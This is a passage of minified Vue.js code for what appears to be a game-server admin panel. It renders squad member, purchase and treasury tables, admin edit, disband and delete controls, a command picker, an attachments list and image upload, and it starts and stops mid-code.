0!==e&&(this.squadMemberListPagination={pageSize:20,pageNum:1,total:0},this.$nextTick((function(){t.getSquadMemberList(),t.getSquadJoinRequestList(),t.getSquadHistoryList(),t.getSquadBuyList(),t.getSquadDollarChangeList()})))}}}}),he=ge,fe=Object(S.a)(he,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("a-tabs",{staticStyle:{"margin-top":"-10px"}},[i("a-tab-pane",{key:"suqad-member",attrs:{tab:"队伍成员"}},[i("a-table",{attrs:{columns:e.squadMemberListColumns,"data-source":e.squadMemberListData,"row-key":"id",pagination:!1,loading:e.loadingSquadMemberListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"user",fn:function(t,a){return[a.user?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.user.userName}})}}},[e._v(" "+e._s(a.user?a.user.userName:a.userId)+" ")])]:e._e()]}},{key:"role",fn:function(t){return[i("span",[e._v(e._s("captain"===t?"队长":"viceCaptain"===t?"副队长":"member"===t?"成员":t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.squadMemberListPagination.pageSize,current:e.squadMemberListPagination.pageNum,total:e.squadMemberListPagination.total},on:{change:e.onChangeSquadMemberListPagination,showSizeChange:e.onShowSizeChangeSquadMemberListPagination}})],1),i("a-tab-pane",{key:"suqad-join-request",attrs:{tab:"入队申请记录"}},[i("a-table",{attrs:{columns:e.squadJoinRequestListColumns,"data-source":e.squadJoinRequestListData,"row-key":"id",pagination:!1,loading:e.loadingSquadJoinRequestListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"user",fn:function(t,a){return[a.userInfo?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.userInfo.userName}})}}},[e._v(" "+e._s(a.userInfo?a.userInfo.userName:a.userId)+" ")])]:e._e()]}},{key:"status",fn:function(t){return[i("span",[e._v(e._s("pending"===t?"处理中":"accepted"===t?"已接受":"rejected"===t?"已拒绝":t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.squadJoinRequestListPagination.pageSize,current:e.squadJoinRequestListPagination.pageNum,total:e.squadJoinRequestListPagination.total},on:{change:e.onChangeSquadJoinRequestListPagination,showSizeChange:e.onShowSizeChangeSquadJoinRequestListPagination}})],1),i("a-tab-pane",{key:"suqad-history",attrs:{tab:"队伍内操作历史"}},[i("a-table",{attrs:{columns:e.squadHistoryListColumns,"data-source":e.squadHistoryListData,"row-key":"id",pagination:!1,loading:e.loadingSquadHistoryListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"user",fn:function(t,a){return[a.userInfo?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.userInfo.userName}})}}},[e._v(" "+e._s(a.userInfo?a.userInfo.userName:a.userId)+" ")])]:e._e()]}},{key:"action",fn:function(t){return[t&&e.historyActionMap[t]?i("a-badge",{attrs:{status:t&&e.historyActionStatusMap[t]?e.historyActionStatusMap[t]:"default"}}):e._e(),i("span",[e._v(e._s(t&&e.historyActionMap[t]?e.historyActionMap[t]:t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.squadHistoryListPagination.pageSize,current:e.squadHistoryListPagination.pageNum,total:e.squadHistoryListPagination.total},on:{change:e.onChangeSquadHistoryListPagination,showSizeChange:e.onShowSizeChangeSquadHistoryListPagination}})],1),i("a-tab-pane",{key:"suqad-buy",attrs:{tab:"队伍仓库"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空队伍仓库吗"},on:{confirm:e.cleanSquadBuyRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanSquadBuyLoading}},[e._v("清空队伍仓库")])],1)],1):e._e(),i("a-table",{attrs:{columns:e.squadBuyListColumns,"data-source":e.squadBuyListData,"row-key":"id",pagination:!1,loading:e.loadingSquadBuyListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"user",fn:function(t,a){return[a.userInfo?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.userInfo.userName}})}}},[e._v(" "+e._s(a.userInfo?a.userInfo.userName:a.userId)+" ")])]:e._e()]}},{key:"itemName",fn:function(t,a){return[a.item?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/items",query:{category:"item",name:a.item.name}})}}},[e._v(" "+e._s(a.item.name))])]:i("span",[e._v(e._s(a.itemId))])]}},{key:"number",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"controls",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("span",[e._v("暂无可用操作")]):[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{disabled:!(a.configs&&a.configs.price),type:"primary",size:"small",icon:"rollback"},on:{click:function(){return e.refundSquadBuyItem(a.id)}}},[e._v("退款")]),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除购买记录吗"},on:{confirm:function(){return e.deleteSquadBuyItem(a.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",size:"small",icon:"delete",loading:e.deleteSquadBuyLoading}},[e._v("删除")])],1):e._e()]]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.squadBuyListPagination.pageSize,current:e.squadBuyListPagination.pageNum,total:e.squadBuyListPagination.total},on:{change:e.onChangeSquadBuyListPagination,showSizeChange:e.onShowSizeChangeSquadBuyListPagination}})],1),i("a-tab-pane",{key:"suqad-dollar-change",attrs:{tab:"队伍金库流水记录"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空队伍金库流水记录吗"},on:{confirm:e.cleanSquadDollarChangeRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanSquadDollarChangeLoading}},[e._v("清空队伍金库流水记录")])],1)],1):e._e(),i("a-table",{attrs:{columns:e.squadDollarChangeListColumns,"data-source":e.squadDollarChangeListData,"row-key":"id",pagination:!1,loading:e.loadingSquadDollarChangeListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"balance",fn:function(t){return[i("span",[e._v(e._s(t.toFixed(2)))])]}},{key:"reason",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss")))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.squadDollarChangeListPagination.pageSize,current:e.squadDollarChangeListPagination.pageNum,total:e.squadDollarChangeListPagination.total},on:{change:e.onChangeSquadDollarChangeListPagination,showSizeChange:e.onShowSizeChangeSquadDollarChangeListPagination}})],1)],1)}),[],!1,null,"e2b88622",null),ye=fe.exports,ve={name:"Squad",components:{SquadTableExpand:ye},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,loadingSquadListTable:!1,squadListFilter:{name:void 0,createdByUserName:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0},squadListColumns:[{title:"ID",key:"id",dataIndex:"id",width:200,align:"center",scopedSlots:{customRender:"id"}},{title:"队伍名称",key:"name",dataIndex:"name",width:180,align:"center",scopedSlots:{customRender:"name"}},{title:"创建用户",key:"createdUser",dataIndex:"createdUser",width:180,align:"center",scopedSlots:{customRender:"createdUser"}},{title:"金库余额",key:"dollars",dataIndex:"dollars",width:120,align:"center",scopedSlots:{customRender:"dollars"}},{title:"队伍状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:120,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],squadListData:[],squadListEditData:[],squadListPagination:{pageSize:20,pageNum:1,total:0},expandedSquadIds:[]}},mounted:function(){var e=this;this.$route.query.name&&(this.squadListFilter.name=this.$route.query.name),this.$nextTick((function(){e.getSquadList(void 0,e.squadListFilter.name)}))},methods:{onSquadListCleanFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/squads"}),this.squadListPagination.pageNum=1,this.$nextTick((function(){e.getSquadList(!0)}))},onSquadListFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/squads"}),this.squadListPagination.pageNum=1,this.$nextTick((function(){e.getSquadList()}))},onChangeSquadListPagination:function(e){var t=this;this.squadListPagination.pageNum=e,this.$nextTick((function(){t.getSquadList()}))},onShowSizeChangeSquadListPagination:function(e,t){var i=this;this.squadListPagination.pageNum=1,this.squadListPagination.pageSize=t,this.$nextTick((function(){i.getSquadList()}))},getSquadList:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n,r,o,l,c,d;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return n=i.squadListPagination,r=n.pageNum,o=n.pageSize,e?(i.squadListFilter={name:void 0,createdByUserName:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0},l={pageNum:r,pageSize:o}):(c=Object(A.cloneDeep)(i.squadListFilter),l=Object(s.a)({pageNum:r,pageSize:o},c)),i.loadingSquadListTable=!0,a.prev=3,a.next=6,f({method:"GET",url:"/squadAdminSys/list",params:l});case 6:d=a.sent,i.loadingSquadListTable=!1,200===d.status&&(i.squadListPagination.total=d.data.count,i.squadListData=d.data.list,i.squadListEditData=d.data.list.map((function(e){return{id:e.id,updateLoading:!1,name:e.name,dollars:e.dollars}})),i.$nextTick((function(){if(void 0!==t){var e=d.data.list.find((function(e){return e.name===t}));i.$set(i,"expandedSquadIds",[e.id])}else i.$set(i,"expandedSquadIds",[])}))),a.next=15;break;case 11:a.prev=11,a.t0=a.catch(3),console.error(a.t0),i.loadingSquadListTable=!1;case 15:case"end":return a.stop()}}),a,null,[[3,11]])})))()},deleteSquad:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/squadAdminSys/delete",params:a});case 4:200===(n=i.sent).status?(t.$message.success("已删除队伍"),t.$set(t,"expandedSquadIds",[]),t.onSquadListCleanFilter()):console.error(n.msg),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},disbandSquad:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/squadAdminSys/disband",params:a});case 4:200===(n=i.sent).status?(t.$message.success("已解散队伍"),t.$set(t,"expandedSquadIds",[]),t.onSquadListCleanFilter()):console.error(n.msg),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},onClickUpdate:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:if((null===(a=t.squadListEditData[e].name)||void 0===a?void 0:a.length)>0){i.next=4;break}t.$message.error("队伍名不能为空"),i.next=23;break;case 4:if("number"==typeof t.squadListEditData[e].dollars&&t.squadListEditData[e].dollars>0){i.next=8;break}t.$message.error("金库余额最小为0"),i.next=23;break;case 8:return n={id:t.squadListEditData[e].id,name:t.squadListEditData[e].name,dollars:t.squadListEditData[e].dollars},t.squadListEditData[e].updateLoading=!0,i.prev=10,i.next=13,f({method:"PUT",url:"/squadAdminSys/update",data:n});case 13:r=i.sent,t.squadListEditData[e].updateLoading=!1,200===r.status?(t.$message.success("操作成功"),t.getSquadList(!0)):t.$message.error(r.msg),i.next=23;break;case 18:i.prev=18,i.t0=i.catch(10),t.squadListEditData[e].updateLoading=!1,t.$message.error(i.t0),console.error(i.t0);case 23:case"end":return i.stop()}}),i,null,[[10,18]])})))()}}},xe=ve,be=Object(S.a)(xe,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"队伍列表"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?void 0:e._e()],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onSquadListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onSquadListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block"}},[e._v("队伍名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.squadListFilter.name,callback:function(t){e.$set(e.squadListFilter,"name",t)},expression:"squadListFilter.name"}}),i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建人:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.squadListFilter.createdByUserName,callback:function(t){e.$set(e.squadListFilter,"createdByUserName",t)},expression:"squadListFilter.createdByUserName"}}),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("队伍状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.squadListFilter.status,callback:function(t){e.$set(e.squadListFilter,"status",t)},expression:"squadListFilter.status"}},[i("a-select-option",{key:"normal",attrs:{title:"正常"}},[e._v("正常")]),i("a-select-option",{key:"disband",attrs:{title:"已解散"}},[e._v("已解散")])],1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block"}},[e._v("创建日期:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.squadListFilter.timestampStart,e.squadListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.squadListFilter,"timestampStart",t[0]),e.$set(e.squadListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.squadListColumns,"data-source":e.squadListData,expandedRowKeys:e.expandedSquadIds,"row-key":"id",pagination:!1,loading:e.loadingSquadListTable,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedSquadIds.find((function(e){return e===i.id}))&&e.expandedSquadIds.push(i.id);else{var a=Object.keys(e.expandedSquadIds).find((function(t){return e.expandedSquadIds[t]===i.id}));void 0!==a&&e.expandedSquadIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"name",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"createdUser",fn:function(t,a){return[a.createdUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.createdUser.userName}})}}},[e._v(" "+e._s(a.createdUser?a.createdUser.userName:a.createdByUserId)+" ")])]:e._e()]}},{key:"dollars",fn:function(t){return[e._v(" $"),i("span",[e._v(e._s(t))])]}},{key:"status",fn:function(t){return[i("a-badge",{attrs:{status:"normal"===t?"success":"disband"===t?"error":"default"}}),i("span",[e._v(e._s("normal"===t?"正常":"disband"===t?"解散":t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t,a){return i("div",{staticStyle:{margin:"0"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("超级管理员操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[e.userInfo.userName!==t.userName?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除队伍吗"},on:{confirm:function(){return e.deleteSquad(t.id)}}},[i("a-button",{attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("删除队伍")])],1):e._e(),"disband"!==t.status?i("a-popconfirm",{attrs:{placement:"right",title:"确定解散队伍吗"},on:{confirm:function(){return e.disbandSquad(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"close",type:"danger"}},[e._v("解散队伍")])],1):e._e()],1),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("span",[e._v("资料更改")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary",size:"small",icon:"save",loading:e.squadListEditData[a].updateLoading},on:{click:function(){return e.onClickUpdate(a)}}},[e._v("更新")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{"line-height":"45px"}},[i("span",[e._v("队名:")]),i("a-input",{staticStyle:{"margin-left":"10px",width:"250px"},model:{value:e.squadListEditData[a].name,callback:function(t){e.$set(e.squadListEditData[a],"name",t)},expression:"squadListEditData[index].name"}})],1),i("div",{staticStyle:{"line-height":"45px"}},[i("span",[e._v("仓库美金:")]),i("a-input-number",{staticStyle:{"margin-left":"10px",width:"250px"},attrs:{min:0},model:{value:e.squadListEditData[a].dollars,callback:function(t){e.$set(e.squadListEditData[a],"dollars",t)},expression:"squadListEditData[index].dollars"}})],1)]:e._e(),void 0!==e.expandedSquadIds.find((function(e){return e===t.id}))?i("SquadTableExpand",{attrs:{"squad-id":t.id}}):e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.squadListPagination.pageSize,current:e.squadListPagination.pageNum,total:e.squadListPagination.total},on:{change:e.onChangeSquadListPagination,showSizeChange:e.onShowSizeChangeSquadListPagination}})],1)])],1)}),[],!1,null,"6e3c9f78",null),Se=be.exports,we=i("b85c"),Le=(i("ddb0"),i("4de4"),i("caad"),i("2532"),{name:"commands-picker",props:{},computed:Object(s.a)({},Object(v.mapState)(["commandSelectConfigs"])),data:function(){return{isShowList:!1,currentType:"",keyword:"",list:[],originalList:{}}},mounted:function(){var e=this;if(this.commandSelectConfigs.CommandsSelectType&&this.commandSelectConfigs.CommandsSelectType.length){var t,i={},a=Object(we.a)(this.commandSelectConfigs.CommandsSelectType);try{var n=function(){var a=t.value;i[a]=e.commandSelectConfigs.CommandsSelectItem.filter((function(e){return e.type===a})).map((function(e){return Object(s.a)(Object(s.a)({},e),{},{number:1})}))};for(a.s();!(t=a.n()).done;)n()}catch(e){a.e(e)}finally{a.f()}this.$set(this,"originalList",i),this.$nextTick((function(){e.currentType=e.commandSelectConfigs.CommandsSelectType&&e.commandSelectConfigs.CommandsSelectType.length?e.commandSelectConfigs.CommandsSelectType[0]:"",e.list=Object(A.cloneDeep)(e.originalList[e.commandSelectConfigs.CommandsSelectType[0]].map((function(e){return Object(s.a)(Object(s.a)({},e),{},{number:1})})))}))}},methods:{onSearch:function(e){this.list=Object(A.cloneDeep)(this.originalList[this.currentType].filter((function(t){return t.name.includes(e)||t.command.includes(e)})).map((function(e){return Object(s.a)(Object(s.a)({},e),{},{number:1})})))},changeItemType:function(e){this.currentType=e,this.keyword="",this.list=Object(A.cloneDeep)(this.originalList[e].filter((function(t){return t.type===e})).map((function(e){return Object(s.a)(Object(s.a)({},e),{},{number:1})})))}}}),ke=Le,Ie=Object(S.a)(ke,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("a-popover",{attrs:{placement:"right",visible:e.isShowList,trigger:"click"}},[i("a-button",{staticStyle:{position:"absolute",right:"10px",top:"10px","z-index":"2000"},attrs:{size:"small",icon:"edit"},on:{click:function(t){e.isShowList=!0}}},[e._v("选择命令")]),i("div",{staticStyle:{width:"500px"},attrs:{slot:"title"},slot:"title"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("常用命令列表")]),i("span",{staticStyle:{cursor:"pointer"},on:{click:function(){e.keyword="",e.isShowList=!1}}},[i("a-icon",{staticStyle:{color:"#ff4d4f",float:"right",display:"inline-block",transform:"translateY(4px)"},attrs:{type:"close-circle",theme:"filled"}})],1)]),i("template",{staticStyle:{width:"500px"},slot:"content"},[i("div",{staticStyle:{width:"100%"}},[i("a-input-search",{staticStyle:{width:"500px"},attrs:{placeholder:"模糊搜索名称/命令"},on:{search:e.onSearch},model:{value:e.keyword,callback:function(t){e.keyword=t},expression:"keyword"}})],1),i("div",{staticStyle:{width:"100%","margin-top":"10px"}},[i("a-tabs",{staticStyle:{"max-width":"500px"},attrs:{type:"card"},on:{change:e.changeItemType}},e._l(e.commandSelectConfigs.CommandsSelectType,(function(t){return i("a-tab-pane",{key:t,attrs:{tab:t}},[i("a-list",{staticStyle:{"max-height":"300px","overflow-y":"auto"},attrs:{size:"small",bordered:"","data-source":e.list},scopedSlots:e._u([{key:"renderItem",fn:function(t,a){return i("a-list-item",{},[i("div",{staticStyle:{width:"calc((100% - 48px) * 0.3)","white-space":"nowrap","text-overflow":"ellipsis","overflow-x":"hidden"}},[i("a-tooltip",{attrs:{title:t.name}},[e._v(e._s(t.name))])],1),i("div",{staticStyle:{width:"calc((100% - 48px) * 0.5)","white-space":"nowrap","text-overflow":"ellipsis","overflow-x":"hidden"}},[i("a-tooltip",{attrs:{title:t.command}},[e._v(e._s(t.command))])],1),i("div",{staticStyle:{width:"calc((100% - 48px) * 0.2)","white-space":"nowrap","text-overflow":"ellipsis","overflow-x":"hidden"}},[i("a-input-number",{staticStyle:{width:"60px"},attrs:{value:t.number,min:1,max:10},on:{change:function(t){e.list[a].number=t}}})],1),i("div",{staticStyle:{width:"48px"}},[i("a-button",{attrs:{size:"small"},on:{click:function(i){return e.$emit("select",t.command,t.number)}}},[e._v("填入")])],1)])}}],null,!0)})],1)})),1)],1)])],2)}),[],!1,null,"98695dee",null),_e=Ie.exports,Te=(i("841c"),{name:"mini-attachments-list",data:function(){return{attachmentsListLoading:!1,attachmentsListSearch:"",attachmentsListData:[],attachmentsListPagination:{pageSize:10,pageNum:1,total:0}}},mounted:function(){this.getAttachmentsList()},methods:{onChangeAttachmentsListSearch:function(e){var t=this;this.attachmentsListPagination.pageNum=1,this.$nextTick((function(){t.getAttachmentsList()}))},onChangeAttachmentsListPagination:function(e){var t=this;this.attachmentsListPagination.pageNum=e,this.$nextTick((function(){t.getAttachmentsList()}))},onShowSizeChangeAttachmentsListPagination:function(e,t){var i=this;this.attachmentsListPagination.pageNum=1,this.attachmentsListPagination.pageSize=t,this.$nextTick((function(){i.getAttachmentsList()}))},getAttachmentsList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.attachmentsListPagination,a=i.pageNum,n=i.pageSize,r={pageNum:a,pageSize:n},e.attachmentsListSearch&&e.attachmentsListSearch.length&&(r.search=e.attachmentsListSearch),e.attachmentsListLoading=!0,t.prev=4,t.next=7,f({method:"GET",url:"/attachmentsAdminSys/search",params:r});case 7:o=t.sent,e.attachmentsListLoading=!1,200===o.status&&(e.attachmentsListPagination.total=o.data.count,e.attachmentsListData=o.data.list),t.next=16;break;case 12:t.prev=12,t.t0=t.catch(4),console.error(t.t0),e.attachmentsListLoading=!1;case 16:case"end":return t.stop()}}),t,null,[[4,12]])})))()}}}),Ce=Te,Fe=Object(S.a)(Ce,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",border:"1px dashed #d9d9d9","border-radius":"3px",padding:"5px","padding-top":"0"}},[i("a-input-search",{attrs:{placeholder:"模糊搜索名称、URL"},on:{search:e.onChangeAttachmentsListSearch},model:{value:e.attachmentsListSearch,callback:function(t){e.attachmentsListSearch=t},expression:"attachmentsListSearch"}}),i("a-list",{staticStyle:{"max-height":"500px","overflow-y":"auto"},attrs:{size:"small",bordered:"","data-source":e.attachmentsListData,loading:e.attachmentsListLoading},scopedSlots:e._u([{key:"renderItem",fn:function(t){return i("a-list-item",{},[i("span",{staticStyle:{display:"inline-block",width:"20%"}},[i("img",{staticStyle:{height:"60px","max-width":"100px"},attrs:{src:t.url}})]),i("span",{staticStyle:{display:"inline-block",width:"20%","white-space":"nowrap","text-overflow":"ellipsis","overflow-x":"hidden","padding-right":"10px"},attrs:{title:t.name}},[e._v(e._s(t.name))]),i("span",{staticStyle:{display:"inline-block",width:"calc(60% - 50px)","white-space":"nowrap","text-overflow":"ellipsis","overflow-x":"hidden","padding-right":"10px"},attrs:{title:t.url}},[e._v(e._s(t.url))]),i("span",{staticStyle:{display:"inline-block",width:"50px"}},[i("a-button",{attrs:{size:"small"},on:{click:function(){e.$emit("select",t.url)}}},[e._v("使用")])],1)])}}])},[i("div",{attrs:{slot:"header"},slot:"header"},[i("span",{staticStyle:{display:"inline-block",width:"20%"}},[e._v("预览")]),i("span",{staticStyle:{display:"inline-block",width:"20%"}},[e._v("附件名称")]),i("span",{staticStyle:{display:"inline-block",width:"calc(60% - 50px)"}},[e._v("URL")]),i("span",{staticStyle:{display:"inline-block",width:"50px"}},[e._v("操作")])])]),i("a-pagination",{staticStyle:{"margin-top":"10px","text-align":"center"},attrs:{size:"small","show-size-changer":"","page-size":e.attachmentsListPagination.pageSize,current:e.attachmentsListPagination.pageNum,total:e.attachmentsListPagination.total},on:{change:e.onChangeAttachmentsListPagination,showSizeChange:e.onShowSizeChangeAttachmentsListPagination}})],1)}),[],!1,null,"320ce7cb",null),Re=Fe.exports,Ee={name:"ImageSelect",components:{MiniAttachmentsList:Re},props:{value:{},disabled:{},showUploadConfig:{}},data:function(){return{uploadConfigType:"file",uploadConfig:{file:[],fileurl:""},uploadLoading:!1}},methods:{uploadImg:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if((i=new FormData).append(e.uploadConfigType,"file"===e.uploadConfigType?e.uploadConfig.file[0]:""),e.uploadLoading=!0,t.prev=3,"file"!==e.uploadConfigType){t.next=10;break}return t.next=7,f({method:"POST",url:"".concat(window.BACKEND_HOST,"/imageAdminSys/imageUpload"),data:i});case 7:a=t.sent,t.next=13;break;case 10:return t.next=12,f({method:"POST",url:"".concat(window.BACKEND_HOST,"/imageAdminSys/imageUploadUrl"),data:{url:e.uploadConfig.fileurl}});case 12:a=t.sent;case 13:if(console.log("resUpload",a),!a||!a.data||200!==a.data.code){t.next=34;break}return 